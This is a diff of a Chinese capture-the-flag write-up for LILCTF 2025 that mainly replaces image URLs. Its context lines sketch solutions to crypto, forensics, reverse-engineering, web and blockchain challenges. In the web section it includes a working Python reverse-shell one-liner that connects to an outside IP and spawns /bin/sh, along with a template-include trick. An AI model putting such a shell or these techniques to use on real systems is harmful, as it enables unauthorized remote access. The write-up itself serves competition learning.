@@ -109,7 +109,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20250817002925200](https://img.0a0.moe/od/01tklsjzed3nlkebjoofbzvwbutm4lqauo)
+![image-20250817002925200](https://img.0a0.moe/blog/2025/08/17/2025lilctf/0aec0a2b77bb36cd66ae94654682f865952c0bc83c5259779480e60e462e82af.webp)
 
 题意是将flag构建对角矩阵并进行一次相似变换，但是通过相似变换特征值不变，因此求矩阵特征值即可得到原来的flag。
 
@@ -194,7 +194,7 @@ pt = unpad(aes.decrypt(msg), 64)
 print("Recovered flag:", pt.decode())
 ```
 
-![image-20250817003139269](https://img.0a0.moe/od/01tklsjzakin22m32u3bbkh4y3gd7vfp3j)
+![image-20250817003139269](https://img.0a0.moe/blog/2025/08/17/2025lilctf/7b64760c0d36b39db8e698471a13fb7f99e5efc4a4ec4aadd2072c22fedef9af.webp)
 
 题意构造了个矩阵，然后使用key对其幂次化，再使用key对flag AES加密。因此要恢复出key，首先要对C特征分解，然后在这个基下对角化D，再解离散对数，使用CRT合并找到最终的key，然后解AES即可得
 
@@ -204,29 +204,29 @@ print("Recovered flag:", pt.decode())
 
 **part1**文件结尾
 
-![image-20250817003414803](https://img.0a0.moe/od/01tklsjzdrv2jpiwe44va27dimlcrvfo36)
+![image-20250817003414803](https://img.0a0.moe/blog/2025/08/17/2025lilctf/2994754652fab38df1f7381dc63d69bb30ce0a4296859e3a3b7fe62b887181e0.webp)
 
-![image-20250817003418696](https://img.0a0.moe/od/01tklsjze4xtqzntamdzaygg6zphusgtq6)
+![image-20250817003418696](https://img.0a0.moe/blog/2025/08/17/2025lilctf/71018d650d1402870bc447e9f842dd8c4e41a7eebabd2a82bac20ff8966b72d2.webp)
 
 **part2**
 
-![image-20250817003603026](https://img.0a0.moe/od/01tklsjzhwnj65vnscyfajvssfc4lvoui5)
+![image-20250817003603026](https://img.0a0.moe/blog/2025/08/17/2025lilctf/93d52d7f8fd6014a2a0526b9d7378c66ecf7941e489580043b62ebf17424d6ef.webp)
 
-![image-20250817003640879](https://img.0a0.moe/od/01tklsjzf7yblcdt32lfcydwgncid6cboi)
+![image-20250817003640879](https://img.0a0.moe/blog/2025/08/17/2025lilctf/d997a093ce8c3780fcbc8b57fc4f0430f044267ff8a30aa7c3e7415d5f5610a7.webp)
 
 **part3**
 
 binwalk得到个压缩包
 
-![image-20250817003807533](https://img.0a0.moe/od/01tklsjzhkkpshdwjdtvdzk44cr7hdokgs)
+![image-20250817003807533](https://img.0a0.moe/blog/2025/08/17/2025lilctf/8f9e5857ffd76e67ede5a830e2321a44bde90768d2059111408f874fc81e7366.webp)
 
 hint 0宽隐写
 
-![image-20250817003924003](https://img.0a0.moe/od/01tklsjzaf34etdvy7cfej4qq7dpkoeg5x)
+![image-20250817003924003](https://img.0a0.moe/blog/2025/08/17/2025lilctf/12fcaf866d26637766db1e180ad937885ebcf923f24aca5f8968f245977708fc.webp)
 
 secret.bin
 
-![image-20250817004032991](https://img.0a0.moe/od/01tklsjzdmfrx5fjmv4vgzdelzw7cj4mp7)
+![image-20250817004032991](https://img.0a0.moe/blog/2025/08/17/2025lilctf/2a895ac24588a4f6af43e6698e686c0c03bbc49d25c293dd3c23ce16c285f2fe.webp)
 
 拼接起来From hex得`LILCTF{Y0u_4r3_Mas7er_in_PNG}`
 
@@ -234,15 +234,15 @@ secret.bin
 
 Content-Length被限制10086，想办法解除限制。尝试的过程就不说了，反正最后nc手动发http请求，发现有IEND，提取出来即得图片
 
-![image-20250817004315396](https://img.0a0.moe/od/01tklsjzg5p3ifgn2q3rajfoaht5hhj2pt)
+![image-20250817004315396](https://img.0a0.moe/blog/2025/08/17/2025lilctf/3af613efca82d9d9f696906826b81a3fc5450f2ac2a23aefea242c081c063399.webp)
 
-<img src="https://img.0a0.moe/od/01tklsjzenb72a6y7azrfl3ullayra76qi" alt="test123" style="zoom:33%;" />
+<img src="https://img.0a0.moe/blog/2025/08/17/2025lilctf/7526a4cb9e86b8b636e80d74642236a8c963aa2606121960b20282feee4637a4.webp" alt="test123" style="zoom:33%;" />
 
 ### 提前放出附件
 
 根据题目名称以及描述里的日期，又看到里面的zip加密套tar，立刻想到了ciscn半决那两个附件。bkcrack明文攻击得到。记得很清楚是因为也干过，而且那时候某个群里面一直在说明文攻击（笑）
 
-![image-20250817004640724](https://img.0a0.moe/od/01tklsjzhbzw3cqaxsp5c3eadlabhpm7d5)
+![image-20250817004640724](https://img.0a0.moe/blog/2025/08/17/2025lilctf/c71dc65f952aee4c9cd94469dc076bf60ae37433c16edd5fb0e567c82da0b0c6.webp)
 
 不过有点不一样的是ciscn当时的tar好像是deflate，不知道怎么爆，这个只是store直接tar结尾padding 00就行
 
@@ -288,11 +288,11 @@ p.interactive()
 
 ~~第一眼没看出来怎么运行powershell脚本的~~。010里打开mp3翻到个script标签，提取出来，然后把执行的那些换成打印来输出解密，逐个逐个手动解
 
-![image-20250817201807154](https://img.0a0.moe/od/01tklsjza7zxz6646gdbh3xjku7ijoy3su)
+![image-20250817201807154](https://img.0a0.moe/blog/2025/08/17/2025lilctf/dcc8f298cb9a2c25020288111825a6c2d7fc5e4d0330b7016cf5a2ed61340c83.webp)
 
 最后得到请求了bestudding.jpg这个文件，同样下载下来同样方法解密两次
 
-![image-20250817005750000](https://img.0a0.moe/od/01tklsjzf4avj5pdnojrfjitbbcjp6zicb)
+![image-20250817005750000](https://img.0a0.moe/blog/2025/08/17/2025lilctf/e401cb6c4d527c3be451eb77d4be3a464d8a605a6417dde42dabe136b834c127.webp)
 
 ### ARM ASM
 
@@ -358,7 +358,7 @@ print(decrypt_48_bytes(encode_byte, t))
 
 U-boot，不懂，查资料问AI，用qemu跑起来，发现要输入密码，附加个gdb给IDA调试用。架构来自于里面的字符串，其他的也跑不起
 
-![image-20250817010754338](https://img.0a0.moe/od/01tklsjzcotywkoyig6nglycrhy5ph7e5f)
+![image-20250817010754338](https://img.0a0.moe/blog/2025/08/17/2025lilctf/92ceb406b2e3cad36053defbeba3895a78d1dfa8a2be8de198bc8a595d36f45c.webp)
 
 ```bash
 qemu-system-arm -M vexpress-a9 -nographic -kernel re-u-boot -gdb tcp::23946 -S
@@ -366,23 +366,23 @@ qemu-system-arm -M vexpress-a9 -nographic -kernel re-u-boot -gdb tcp::23946 -S
 
 逐步跟踪到输入密码的函数，一个while 1，解密字符串提示输入密码，然后获取输入，传入密码处理校验。下面是对密码处理并校验的函数
 
-![屏幕截图 2025-08-16 032156](https://img.0a0.moe/od/01tklsjzcvn5jurrhdajaishchqrwdateo)
+![屏幕截图 2025-08-16 032156](https://img.0a0.moe/blog/2025/08/17/2025lilctf/827f488a6382cf36b3f2b0ef453860db63e80daf8c10e179e41bb1ef34e41243.webp)
 
 得到是异或0x72然后换表base58
 
-![屏幕截图 2025-08-16 032208](https://img.0a0.moe/od/01tklsjzbh2btjx44yrrfip3ikso6ozv7w)
+![屏幕截图 2025-08-16 032208](https://img.0a0.moe/blog/2025/08/17/2025lilctf/862d8f931c976188af6071e0c93e6beb107c9dc439d7e288dcaeee270386bc73.webp)
 
 ### Qt_Creator
 
 没看到有什么加密函数，而且出得很快，怀疑是明文比对，使用Cheat Engine搜字符串没搜到。先让程序跑起来，然后在输入注册码的时候IDA Attach上去，在0x410100打断点逐步调试瞎找，真找到了
 
-![屏幕截图 2025-08-16 163738](https://img.0a0.moe/od/01tklsjzcntl2ncyobtng25pisb7p5kfhn)
+![屏幕截图 2025-08-16 163738](https://img.0a0.moe/blog/2025/08/17/2025lilctf/a2a509de324bab1e229492753e6d5147edf61b24c4ac09e9cb1c82f3841d1303.webp)
 
 ### obfusheader.h
 
 根据题意，动态调试，找到输入flag的地方
 
-![image-20250817011531615](https://img.0a0.moe/od/01tklsjzh6h7q5l526qrgjpn5fvfi4uzec)
+![image-20250817011531615](https://img.0a0.moe/blog/2025/08/17/2025lilctf/013276041bf657c11c84e467802aae557f8ff0b1ff3715048469555b5c7718d1.webp)
 
 然后给存储输入flag的地方打个读写断点，每次断的时候看看干了什么就行
 
@@ -476,7 +476,7 @@ r = s.post(host+'/admin/settings', data={'time_api': 'http://ip:port'})
 import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('40.119.192.139',30003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])
 ```
 
-![屏幕截图 2025-08-16 221234](https://img.0a0.moe/od/01tklsjzbszrgxb53nn5ejzdlzjo4cbjn5)
+![屏幕截图 2025-08-16 221234](https://img.0a0.moe/blog/2025/08/17/2025lilctf/8d052f7e083a813ecca6040c1e8b9335d0251659ab2839cde77bd5481ebd7aad.webp)
 
 ### ez_bottle
 
@@ -492,13 +492,13 @@ import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 % include ("test1.txt")
 ```
 
-![屏幕截图 2025-08-16 193315](https://img.0a0.moe/od/01tklsjzg4kujy5a27ebb3ci23koz7fip5)
+![屏幕截图 2025-08-16 193315](https://img.0a0.moe/blog/2025/08/17/2025lilctf/354359699b6c352b6b25e31bc356488cf1ae32e70b0c4ffb9775d1de212e0162.webp)
 
 ## Blockchain
 
 部署合约，获取合约字节码
 
-![image-20250817123121053](https://img.0a0.moe/od/01tklsjzhsj7bnzkvn7vazkpfjnthlbhv2)
+![image-20250817123121053](https://img.0a0.moe/blog/2025/08/17/2025lilctf/b138a1b2512befc59eaf3858b0d47db658c35b3d27b183b2f462bacf47ae4a68.webp)
 
 反编译，https://ethervm.io/decompile和JEB都用了一下，感觉差不多，反编译完看一下，然后是`0x5cc4d812`这个sig的函数传入一个值，经过异或后，keccak256与slot里的数据进行比对
 
@@ -525,7 +525,7 @@ print(table_slot_data)
 
 拿了之前出过但没用上的题目exp脚本，打印一下slot，得到结果后异或一下
 
-![image-20250817123514425](https://img.0a0.moe/od/01tklsjzahwpsxtldlm5clzcvrlhrgt6fs)
+![image-20250817123514425](https://img.0a0.moe/blog/2025/08/17/2025lilctf/d435628800a82c735b02a0a808096702d02fb28e7288209bfe39004c73e73279.webp)
 
 丢给AI写交互解题脚本
 
@@ -588,6 +588,6 @@ result = w3.eth.call({
 print("isSolved:", int(result.hex(), 16) != 0)
 ```
 
-![image-20250817123615304](https://img.0a0.moe/od/01tklsjzax4ewpaiohxzfzehw5fbmd7emg)
+![image-20250817123615304](https://img.0a0.moe/blog/2025/08/17/2025lilctf/d1b68ccd9a12387e4e44fae74bc5fd32a71dca7c03c39ab4f62ebf70901a68ff.webp)
 
-![image-20250817123640786](https://img.0a0.moe/od/01tklsjzgkcf2hy4jpgvhl2bomc3q26asf)
+![image-20250817123640786](https://img.0a0.moe/blog/2025/08/17/2025lilctf/dd910dc27afb627f308fdf185d596c3ced4630f96b71e880f55a9f37567a3714.webp)
